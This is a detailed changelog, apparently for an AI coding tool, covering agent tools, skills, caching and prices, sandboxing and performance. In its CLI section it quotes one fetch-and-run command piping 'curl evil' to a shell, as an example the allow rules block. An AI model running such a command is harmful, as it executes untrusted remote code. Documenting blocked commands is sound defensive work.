### Skills applied automatically (researched and measured)
- A request that clearly matches a skill (two or more distinct words in its name and description, rarity-weighted, at most two skills) now gets that skill's instructions up front, in the CLI and the app, instead of relying on the model to call `use_skill`. `--no-auto-skills` and a Settings checkbox turn it off.
- Measured on a local 7B model (60 runs per condition): conventions followed 0 of 60 with no skills, 3 to 5 of 60 with the skills only listed, 31 to 32 of 60 applied automatically; nothing applied on unrelated requests. Offline matching: 95% precision, 91% recall on 36 labelled requests written by the author. One model, artificial conventions, string-match scoring: see `docs/AUTO-SKILLS.md` for the limits.
- No automatic persona switching: the research found no reliable gain (and a random-level automatic choice). Specialists stay explicit.
- Dropped a first-version rule that let one word from a skill's name count alone (87% precision, "release the lock" applied the release skill).

### Fixes from a second review (the Rust indexer and the desktop lib)
- **A failed database write left the index claiming files it had not stored.** Since index writes were pipelined, the in-memory index was updated while the writer was still storing batches, so a write error (disk full, a locked database) left memory ahead of the database until a restart. Before the pipelining, a failed write stopped before touching memory. Memory is now reset on a write failure, so it never claims more than the database has. A test breaks the database underneath the index to force the failure (memory held 10 files after the failed write before the fix, 0 after).
- **The agent's `diagnostics` check could answer for older text.** Right after the editor's text changed, and before the language server had published again, the cached diagnostics described the previous text, so a file the agent had just broken could be reported as having no problems. A changed file is now marked dirty and checked fresh until the server answers; the cache is also cleared when the workspace changes. Three tests.
- Hardened the index phase timer with a saturating subtraction (it cannot actually go negative, since the recorded times are wall-clock, but a panic in debug builds was one subtraction away).
- **Reviewed and left alone:** the empty-row fallback when a parse result cannot be serialised is deliberate and documented (the file is simply re-indexed; serialising these plain structures cannot fail in practice); `find_files` lowercasing 100k paths per call is a few milliseconds, not worth the extra memory; and a nit about two callers of the Claude status check sharing one in-flight question affects only which cache they write to.
- 589 unit tests, the Rust tests and 56 end-to-end tests pass; clippy and rustfmt are clean.

### Fixes from a code review of the recent changes
A review of the TypeScript changes (gateway, text tool calls, find_files; the Rust and desktop-lib changes were not covered) found five things; four were real and are fixed:
- **`find_files "[id]"` found nothing.** A pattern with `[` was treated as a glob, so a Next.js route segment like `[id]` matched no path. A bracket is now a plain character (a glob needs `*`, `?` or `{`), in both the Rust index and the fallback.
- **Cached OpenAI-compatible tokens were billed at the full rate.** They were reported but priced as fresh input, so cost and Max $ ran high. They are now priced at the cache rate (set per model in Settings > Model prices).
- **A reply starting with `[` or `{` was held back until it finished** (in case it was a tool call written as text), so "[1] The fix is..." appeared all at once at the end. Text is now released as soon as it cannot be JSON (`{` must be followed by `"` or `}`, `[` by `{` or `]`).
- `find_files` skipped the output cap on its early return.
- **Not a bug, left alone:** the review flagged the cache-read rates for Sonnet 5.5, Opus 5.5 (0.05x) and Fable 5.2 (0.025x) as too low against Haiku's 0.1x. They come from Anthropic's published table (read 2026-11-23), where those models differ; the source is cited in the code.
- Tests for each fix; 586 unit tests and 56 end-to-end tests pass.

### A race in the Context pane (and the rules-panel test that failed now and then)
- **Fixed a real latent bug:** the Context pane (rules for the active file, memory search, skills, docs, plans, checkpoints, saved prompts) loaded its list in an effect with no ordering guard, so when loads overlapped the one that **finished** last won, not the one that **started** last. Switching file quickly could leave the rules of the previous file on screen, and typing "ab" in the memory search could end up showing the results for "a". Each of those effects now goes through `latestOnly`, where only the most recent load may apply its result and unmount drops whatever is in flight. Seven unit tests force the out-of-order completion by hand (a slow older load finishing after a newer one, a scrambled burst of six, cancellation, failures).
- **What is not established:** this race fits the intermittent rules-panel end-to-end failure (stale result = root rules only, no nested `server/AGENTS.md`), but I could not make it happen. Tauri's `invoke` is read-only, so a read cannot be slowed from a test, and 75 rounds of rapid tab switching (over 1,800 overlapping loads) on the unfixed code never produced a stale list. `rules-race.spec.ts` keeps that stress as a guard; it passed before and after the fix, so it does not prove the fix. The test did fail in several full runs shortly after the Claude-plan change and not in the many since (the status is cached, the header no longer shifts), so the earlier failures may equally have come from that; the cause is still unproven.

### External apps over MCP, and measured cache reuse
- **Big MCP results are compacted locally** before the model sees them (over 12,000 characters): JSON keeps the top level and the first items of each array with every cut counted, other text keeps its beginning and end, a note says what was done. A failing call still fails, with its error compacted the same way. Before, an MCP result went to the model whole and a scene dump could fill the context in one call.
- **Errors from external (MCP) tools count toward escalation**: a step in which one returned an error is a failed attempt like a failed check (builder first, architect second). Permission denials, hook blocks and built-in tool failures do not count.
- Tests: compactor (7), a real MCP server process behaving like a game-editor bridge (4), the run loop with a real MCP server whose tool fails (3), `pickTier` with tool errors (2). Mutation-checked: the error-bridge test fails when the counting is removed.
- **Prefix reuse measured** with a real model server (Ollama 7B): 89-92% of the prompt reused from step 2 on, 98% at the start of a run with a different request. `prefix.spec.ts` shows in the real window that the system text and tools are byte-identical across the steps of a run, including after an edit. A ready-to-run Anthropic check (`FORGE_LIVE_ANTHROPIC=1 ANTHROPIC_API_KEY=... npx vitest run packages/agent-runtime/test/cache.live`, a fraction of a cent) is included; I have not run it, so Anthropic's actual cache hits and savings remain unverified.
- Not run against Unity, Blender or Unreal themselves.

### Prompt caching and correct Claude prices
- **Anthropic prompt caching.** Requests now use automatic caching (a breakpoint that follows the end of the conversation, so each step of a tool loop reads the earlier steps from the cache instead of paying for them again) plus an explicit breakpoint on the stable system text. The system prompt is sent as separate messages: the stable part (rules, mode) first, then the sections that change (repo map, attachments, plan), so the stable part stays cached when the rest changes. Prefixes under the model's minimum (512 tokens for the 5.5 models) are simply not cached, with no error.
- **Usage and cost.** Cache reads and writes are read from the stream and priced separately (writes 1.25x; reads 0.1x, or 0.05x for Opus 5.5 and Sonnet 5.5, 0.025x for Fable 5.2). `Usage.inputTokens` is now the whole prompt, so the token meter compares like with like (Anthropic's own `input_tokens` excludes cached tokens, which would have collapsed the meter's calibration and delayed compaction). OpenAI-compatible providers report their automatic `cached_tokens` the same way.
- **Prices were wrong.** The price table had older, higher numbers (Sonnet $3/$15, Opus $15/$75, Haiku $1/$5 per million) so cost and the Max $ limit overstated Claude spend. It now follows Anthropic's published table (Sonnet 5.5 $2/$10, Opus 5.5 $4/$20, Haiku 5.5 $0.10/$0.50 with a higher rate above 100k prompt tokens, Fable 5.2 $8/$40), with the source and date in the code. Models without a price (local models, other providers) are still counted as free, so the Max $ limit does not see them.
- Tests: 13 new gateway tests on pricing, request bodies, usage parsing and a byte-identical cached prefix between steps. **Not verified live**: there is no way to call Anthropic from here, so real cache hits and the saving are untested; the request and stream handling are tested against the documented shapes.

### Verification checks files the editor never opened
- The verification report's diagnostics check only knew about files open in the editor, so an error in a file the agent created or edited and you never opened was missed: the report could say **Verified** over a type error (shown by disabling the new path: the same run reported "Verified"). It now uses the editor's markers for open files and asks the language server about the others (the on-disk text of each touched file, up to 20, in parallel). Files it could not check (no server for that type, a slow server, a deleted file) are skipped rather than claimed either way. The check is labelled "Language server" in the report.
- Tests: `collectErrors` units (5), and `verify-unopened.spec.ts` in the real window (the agent writes a broken file nobody opens; the report must say "Checks failed" with `src/broken.ts:1:14` and the TypeScript message; 3 of 3 runs, red without the change).
- Known limit: a file the server could not check does not show up in the report at all, so "Verified" still means "no errors found where it could look".

### Agent tool: diagnostics
- New `diagnostics` tool: the agent can ask the language server (TypeScript/JavaScript and Python) about one file in about a second, without running the project's checks. It checks the file **as the agent sees it, including its own unaccepted edits**, so it can verify an edit before the developer has accepted it. Errors come first with 1-based line:col, code and message; long lists are capped. Read-class (Ask and Plan mode have it), refuses secret files and path escapes, and says plainly when no server covers the file or the server did not answer (it does not replace `run_checks`).
- How: the text is opened on the language server under a sibling shadow uri (`a.ts` -> `a.forge-check.ts`), so the editor's own document, version numbers and diagnostics are never touched, and the editor never sees the probe's results. An editor document with exactly the checked text answers from its live diagnostics instead. Checks of one file run one at a time; the server is given 15 s, and answers are taken once it has gone quiet, so a second round of diagnostics is not missed. Not offered in isolated threads (their worktree has no language server).
- Found while testing: closing and reopening the editor's own document around a probe made the server publish an empty list that was mistaken for the answer, which is why probes use a shadow uri.
- Tests: tracker and tool units (15 + 5), and `diagnostics.spec.ts` against the real TypeScript server (a file the editor never opened, a pending edit to an open file, an unsupported file, and the editor still saving normally afterwards; 5 of 5 runs).

### Agent tools: find files, better grep
- New `find_files` tool: find files by name. A pattern with `* ? [ {` is a glob (`*.test.ts` matches anywhere, `src/**/*.ts` is anchored, `*.{ts,py}` works); anything else is a case-insensitive part of the path (`auth` finds `src/auth/login.ts`). Answered from the Rust index (honours .gitignore, never lists excluded or secret files); a plain-walk fallback covers the CLI and an index that is not ready. Read-class, so Ask and Plan mode have it.
- `grep` gains `ignore_case` and `files_only` (each matching file once, however many hits it has), in both the indexer and the fallback. The fallback's glob now follows the indexer's rule (a pattern without a slash matches by name anywhere) and supports `{a,b}`.
- Tests: Rust (`find_files`), tool-host and indexer units, and `find-files.spec.ts` in the real window (a gitignored decoy file proves the index answered).

### First index twice as fast
- Indexing a 120,000-file repo for the first time: 6.3 s -> 2.9 s (-54%), same result. The change-detection pass (read and hash every file) is skipped when nothing is indexed yet, and SQLite writes now run on their own thread, overlapped with parsing, with serialisation done on the parallel workers. ### First-message latency
- Measured Enter-to-model-request with trace marks (`src/lib/trace.ts`): 31-37 ms once the agent process runs; a cold first message was 310-390 ms, all of it the runtime process booting (the OS's first-ever run of the 100 MB executable), not our code. Fixes: the shared agent process now starts when the agent input is focused (first message 52 ms; released after 60 s if unused), and absolute `.exe` paths are spawned directly instead of through `cmd.exe` (tested). New specs `latency.spec.ts` (budget for the warm path) and `prewarm.spec.ts`.

### Monaco trimmed to what the app uses
- `src/lib/monaco-features.ts` imports only the editor features Forge-Code uses (no go-to-definition, rename, code actions, signature help, colour picker, formatting, semantic tokens, inlay hints, code lens, and no TypeScript/HTML/CSS language services, whose workers were never provided): the engine chunk 3,334 -> 3,135 KB (-6%), everything shipped 5,126 -> 4,827 KB. No measurable memory change; the benefit is about 200 KB less to download and parse. Verified by end-to-end tests for syntax colouring across seven file types (plain text stays uncoloured), find, and the F1 palette with our AI action, plus the existing suites. Tied to the pinned Monaco 0.52.2 (a missing path fails the build).
- A guard test (`monaco-features.test.ts`) checks every listed module exists in the installed Monaco, that the version is the pinned 0.52.2, that the features the app depends on stay in the list and the unused language services stay out. An upgrade now fails there with the exact missing paths. It was verified to fail when a path is broken.
- Final startup, real release build, baseline vs now: DOM ready 196 -> 34 ms, first paint 228 -> 128 ms, shell mounted 324 -> 134 ms, startup JavaScript 3,971 -> 357 KB; memory 385 -> 378 MB.

### One agent process for every thread
- All agent threads now share a single `forge-runtime` process instead of one each: memory for three threads 97 -> 33 MB (-66%). A session id on every line (`{"s": id, "m": message}`, `{"s": id, "end": true}`), a runtime per id inside the process, started on demand and released when the last thread closes. Failure modes handled and tested against real processes: isolation between sessions, closing one aborts only its own work, a crashed process fails every pending run immediately (it used to hang) and the next message starts a fresh process with the conversation carried over.
- Fixed two real bugs found along the way: closing a thread did not cancel its in-flight model request (the host kept streaming and spending tokens), and a page reload orphaned the agent runtime, MCP/ACP servers and background commands until the app exited (they are now stopped when the page starts loading).

### Warm open of huge repos
- Profiled with new per-phase build timings (`BuildStats.phases`). Reopening a 120,000-file index 999 -> 662 ms (rows decoded on every core in bounded chunks, maps pre-sized); a warm build with nothing changed 809 -> 225 ms (the Merkle tree is no longer rebuilt and diffed when the file set and hashes are provably unchanged; the root is computed on demand); the import graph (about 410 ms) is built after "ready" instead of inside the build. Total until ready 1,808 -> 887 ms (-51%). Tests cover unchanged / added / edited / deleted / restart, including the Merkle root. Rejected after measuring: SQLite memory-mapped reads (faster, but a crash risk if the index file is truncated). Also removed three long-standing compiler warnings.

### Performance pass (measured; details and rejected ideas in docs/PERFORMANCE.md)
- Startup JavaScript 3,971 KB -> 355 KB (-91%): the Monaco editor engine (3.3 MB) now loads on first file open and is warmed in the background after a workspace opens; the terminal (xterm.js) and the review, plan and context views load when first shown. Real release window, median of 5: DOM ready 153 -> 26 ms, first paint 216 -> 112 ms, shell mounted 278 -> 118 ms. Steady-state memory is essentially unchanged (380 -> 374 MB) because the editor loads moments after startup anyway.
- Rust release profile (LTO, one codegen unit, stripped; panics still unwind): executable 36.4 -> 34.5 MB, and most index operations 10-15% faster.
- Semantic search on 480,240 chunks 138 -> 7 ms (about 19x): bounded per-thread top-k instead of scoring-and-sorting every chunk, and a vectorisable dot product. Tests prove it equals the old ranking.
- Removed a one-second localStorage poll in the UI (settings changes are now an event).
- `scripts/perf-startup.mjs` measures the real release app (startup, memory, idle CPU) so these numbers can be repeated.

### Skills, part 2: typed scripts, personal skills, a panel
- **Typed scripts.** A skill can declare its scripts' arguments in `tools.json` (`{ "bump.js": { "description", "parameters": { JSON-schema subset } } }`). The model sees the declared usage in `use_skill`, and `run_skill_script` validates the arguments (required, type, enum, length, min/max, optional `additionalProperties: false`) before anything runs, answering with exactly what was expected. A broken `tools.json` is reported (in `use_skill` and in the panel) instead of being silently ignored, and an unreadable declaration is not enforced. Undeclared scripts still accept any arguments. Deliberately a single `run_skill_script` entry point rather than dynamically registered tools, so the tool list does not grow with the number of skills.
- **Personal skills** from `~/.forge/skills` (the CLI reads `HOME`/`USERPROFILE`), merged with the repository's; a repository skill wins over a personal one of the same name. The audit log says which kind ran. A personal script lives outside the workspace, so in the OS sandbox it cannot be read and fails closed with the sandbox's own explanation (a note, not a silent skip).
- **Skills panel** (Context > Skills): name, this repo / personal, description, scripts (marked typed), `tools.json` problems, Open SKILL.md.
- Known limits: the permission prompt appears before the arguments are validated, so a call with bad arguments still asks first and then fails; skills are read when a session starts for the tool list but fresh on every `use_skill`/`run_skill_script`; no UI to create a skill yet.

### Skills that carry scripts (research gap #4, the rest)
- `.forge/skills/<name>/SKILL.md` (optional `description:` front matter) plus scripts and reference files in the same folder. The model sees an index (name, description, which scripts exist) every turn, loads a skill's instructions with `use_skill` (a read: no prompt), and can run its bundled scripts with `run_skill_script` (execute class, so the permission gate asks first; one script per call, never a shell string).
- Safety by construction: the script name must be one the skill folder actually lists (no `..`, no sub-paths, no reference files, no invented names); only `.js/.mjs/.cjs/.py/.sh` map to an interpreter; the command line is generated from validated names and a path that is rejected if it contains shell metacharacters; the model's `args` never touch the command line, they are written to a small JSON file inside the workspace (the sandbox can read it) whose path is the script's single argument, and the file is removed afterwards even if the run fails. Unit tests include hostile argument text and path tricks; an integration test runs a real script through the real permission gate with real Node (approve: it runs with its arguments; decline: it never runs).
- Runs through the same exec as `run_command`, so the Windows OS sandbox applies when it is on, and the result now says which isolation was used and passes along the sandbox's warnings. **Found on this machine:** the sandbox could not grant read access to the Node install folder under Program Files (granting ACLs there needs elevation), so a script run in the sandbox fails with "node is not recognized", the same as `run_command node ...` would. That is the sandbox failing closed, and the new output explains it to the model instead of hiding it; the end-to-end test of a successful run therefore turns the sandbox off, and a second test checks the sandboxed path is taken and reported.
- The CLI offers `use_skill` and the index (instructions only). Bundled scripts are never offered there because the CLI has no OS sandbox.
- Trust: a skill is repository content, like AGENTS.md. Its scripts are code from the repo you opened, which is why every run asks first. Not built: skills that declare their own tool schemas, per-user (non-repo) skills, a skills panel in the UI.

### Isolated threads: a git worktree per thread (research gap #3)
- `+ isolated` in the thread strip starts a thread in its own git worktree (`.forge/worktrees/<id>`) on its own branch (`forge/<id>`), with its own services rooted there, so parallel threads cannot collide on files. Its edits are applied in that checkout (never in your files); `Changes` shows `git diff --stat`, `Merge into main` commits the thread's work, merges it `--no-ff` and removes the checkout and branch, and `Discard` (two clicks) throws it away. A conflicting merge is aborted, leaving main exactly as it was and the thread's branch intact. Needs a git repository with at least one commit, and says so otherwise.
- Git surface (`git.rs`) grew by exactly the commands this needs, each validated: worktrees only at `<root>/.forge/worktrees/<name>`, branches only `forge/<name>`, merges only `--no-ff` of those, `merge --abort`, `diff --stat HEAD...forge/<name>`. Tests cover the lifecycle with real git and 17 refused variants.
- Traps found and fixed: a repository nested in the workspace would be staged by `git add -A` as an embedded repo (a local `.git/info/exclude` entry now hides it); an isolated thread's runtime state (checkpoints, audit, pending) would have been committed to its branch (it now lives in `.forge/threads/<id>` outside the checkout); the agent runtime process held the worktree as its working directory so Windows could not delete it (started without it); and the edit tool and ACP write check rejected any path with an ignored folder *above* the workspace root, so a worktree under `.forge/` could not be edited at all (they now judge only the part below the root; `inIgnoredDirBelow`). Removal failures are reported, not swallowed.
- Not done: threads are not restored after a restart (leftover checkouts are listed in a notice so they can be merged or removed with git); isolated threads do not use the shared code index (it describes the main checkout); MCP/ACP servers configured for the repo start in the worktree and can keep it open on Windows, which a failed discard will report.

### Edit prediction (research gap #5)
- Ghost-text completions at the cursor, accepted with Tab (Monaco inline completions). **Off by default**: with it off, nothing is sent (the e2e asserts zero requests). Turning it on in settings shows plainly that the code around the cursor goes to the model each time you pause, and warns when the provider is not on this machine; local-only mode still blocks off-machine requests because it goes through the same guarded gateway. Pauses of 350 ms debounce it, in-flight requests are cancelled when you keep typing, replies are capped (12 lines / 800 chars) and cleaned (fences, the already-typed part of the line, and characters that already follow the cursor are removed), and it skips an empty file or the middle of a word. A separate `Completion model` setting lets you use a small fast model.
- Verified with unit tests and a real-window e2e against a mock server. **Not verified:** completion quality with a real model. It uses a chat-style prompt that works with any model; models with native fill-in-the-middle support would likely do better, which is future work.

### CLI command execution (`--allow`)
- `forge-code run "..." --allow "npm test" --allow "npm run lint*"` lets the agent run those commands, so it can run the tests, read the real failures and fix the code (verified end to end with a failing check that the agent repairs). Nothing runs unless allowed; a trailing `*` allows any arguments but never chained, piped, substituted or redirected commands (`npm test*` does not permit `npm test; curl evil | sh`); the catastrophic-command deny list applies even to allowed patterns; background processes are not offered. **Important limit:** the CLI runs commands with a scrubbed environment but without the OS sandbox the desktop app uses, and the tool description tells the model exactly that.
- `nodeExec` now kills the whole process tree on timeout (it killed only the shell on Linux and macOS, which could leave the call hanging). Verified on Windows locally; the Unix path is checked by CI.

### Saved prompts / slash commands (research gap #4, the repo-file part)
- `.forge/prompts/<name>.md` files become slash commands: type `/` in the agent panel for autocomplete (Tab completes), `/review src/a.ts` sends the file's text with `$ARGUMENTS` replaced (arguments are never interpreted as replacement patterns; a body without the placeholder gets the arguments appended). Optional `description:` front matter, else the first line. Unknown `/words` are ordinary text. The CLI expands them too: `forge-code run "/review src/a.ts"`, so a team shares one set of workflows between the app and CI. Unit tests, a real-window e2e, and CLI tests. Not built: skills that carry tools or scripts, and per-user (non-repo) prompts.

### Headless CLI (research gap #6)
- `forge-code ask "..."` (read-only) and `forge-code run "..."` (agent). Review-first like the app: `run` prints unified diffs and writes nothing unless `--apply`. `--json` for scripts, exit codes 0 done / 1 error / 2 stopped at a limit, `--max-steps`, `--max-cost`. The API key comes only from `FORGE_API_KEY`/`ANTHROPIC_API_KEY`/`OPENAI_API_KEY` (no flag, so it cannot leak into shell history). No shell commands are offered to the model in this first version. Build with `npm run build:cli` (one file: `node target/cli/forge-code.cjs`). Verified by unit tests and by running the bundle as a real process against a mock model server.

### Race fix found by CI
- `Background::read` could report a finished process before its output readers had copied the final lines, so the agent could miss a process's last output (flaky on Linux CI). It now waits (bounded, 500 ms) for the readers to drain once the process has exited.

### Parallel agent threads (research gap #2)
- Several agent threads run at once: a tab strip above the agent panel (`+` to add, "Close thread" for finished ones). Each thread is its own conversation with its own runtime (worker or process), keeps running while hidden, and shows a running dot. Edits from every thread land in the shared review queue and go through the usual conflict check on accept.
- Concurrency fixes this needed: permission prompts now queue instead of overwriting each other (a second prompt used to orphan the first), per-thread saved sessions, per-thread runtime cleanup (the global "live runtime" that would have killed other threads' runtimes is gone), and a run counter so accepting changes mid-run never triggers the post-accept verification.
- Not done: a git worktree per thread. Two threads editing the same file are caught at accept time (conflict check), not prevented. The permission queue is untested under real concurrent prompts. The conversation log is now keyboard-focusable (axe).

### First CI run (Windows and macOS green, Ubuntu found a real bug)
- On Linux a command that exceeded its timeout was not actually stopped: only the shell was killed, its child kept the output pipes open (the timeout test took 30 s). Commands, background processes and MCP/ACP processes now start in their own process group on Unix and the whole group is killed (`exec.rs`, `bg.rs`, `proc.rs`).
- The keyring test skips on headless Linux (no Secret Service); CI annotates cargo failures so they can be read without log access.

### Remaining-gaps follow-up
- Pending changes persist across restarts (.forge/pending, restored with reasons, decisions and change sets; the normal conflict check still runs on accept).
- The agent loop can run in its own OS process: `forge-runtime`, a Node single-executable (`npm run build:sidecar`, about 100 MB because it embeds Node) bundled as a Tauri `externalBin` and driven over newline-delimited JSON on stdio (same protocol as the worker, `stdio.ts`). Falls back to the Web Worker if it cannot start; the panel shows `agent: process|worker`. Exits when the host closes its stdin, so no orphans. Verified: unit test against a real child process and against the packaged exe, and an e2e in the real window asserting `agent: process`.
- The agent loop (context assembly, compaction, redaction, limits, verify-fix feedback) runs in a Web Worker behind a typed message protocol (`agent-runtime/src/remote.ts`); files, HTTP, permissions, hooks, verification and indexing stay on the main thread and are served to the worker. Falls back to in-process when Workers are unavailable. This is a thread boundary, not an OS process: no Node sidecar is bundled.
- Neural embeddings: optional local Ollama-compatible embedder (`Embedding model` setting, loopback only, probes the vector size, falls back to the built-in lexical embedder with a notice, zero vectors on a later outage). Verified against a mock server and against a real Ollama 0.40.16 with nomic-embed-text (768 dimensions): 4 of 4 queries that share no words with the code found the right file, versus 1 of 4 for the built-in lexical embedder (opt-in test: `cargo test -p forge-core --test neural_live --release -- --ignored --nocapture`). Indexing now sends up to 16 chunks per request (`embed_batch`; a failed group is retried one by one so one bad chunk cannot zero its neighbours). Measured on the real model with it warm: 64 chunks took 343 ms one request each versus 200 ms batched (1.7x), with the same vectors (cosine > 0.99). An earlier note here blamed per-request overhead for a ~40 s first run; that was mostly the model loading cold, not the requests. Checked through the Rust index API, not by clicking through the settings UI.
- Indexer: bounded in-memory content cache. On a synthetic 120,000-file / 960k-line repo: first index 5.8 s (background, search usable during it), warm grep about 10 ms (was 1.07 s), symbol lookup under 1 ms, incremental reindex 15 ms. The first search after launch is cold (about 1 s) while the cache fills.
